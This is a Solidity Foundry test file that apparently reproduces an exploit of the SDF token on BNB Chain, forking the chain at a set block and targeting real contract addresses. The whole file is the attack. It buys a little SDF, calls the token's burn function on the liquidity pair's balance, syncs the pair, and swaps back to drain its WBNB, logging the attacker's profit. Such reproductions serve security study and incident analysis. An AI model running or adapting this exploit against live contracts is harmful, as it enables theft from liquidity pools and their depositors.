pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20} from "src/interfaces/IERC20.sol";

import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";

interface ISDF {
    function burn(address, uint256) external;
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IPair {
    function sync() external;
}

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniswapV2Router Router =
        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    ISDF SDF = ISDF(0x10bc28d2810dD462E16facfF18f78783e859351b);
    IPair Pair = IPair(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A);

    function setUp() public {
        vm.createSelectFork("bsc", 20_969_095);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker WBNB balance before exploit",
            WBNB.balanceOf(address(this)),
            18
        );

        (bool success, ) = address(WBNB).call{value: 0.01 ether}("");
        WBNBToSDF();
        SDF.burn(address(Pair), SDF.balanceOf(address(Pair)) - 1);
        Pair.sync();
        SDFToWBNB();

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit",
            WBNB.balanceOf(address(this)),
            18
        );
    }

    function WBNBToSDF() public {
        WBNB.approve(address(Router), ~uint256(0));
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SDF);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        SDF.approve(address(Router), ~uint256(0));
    }

    function SDFToWBNB() public {
        address[] memory path = new address[](2);
        path[0] = address(SDF);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SDF.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
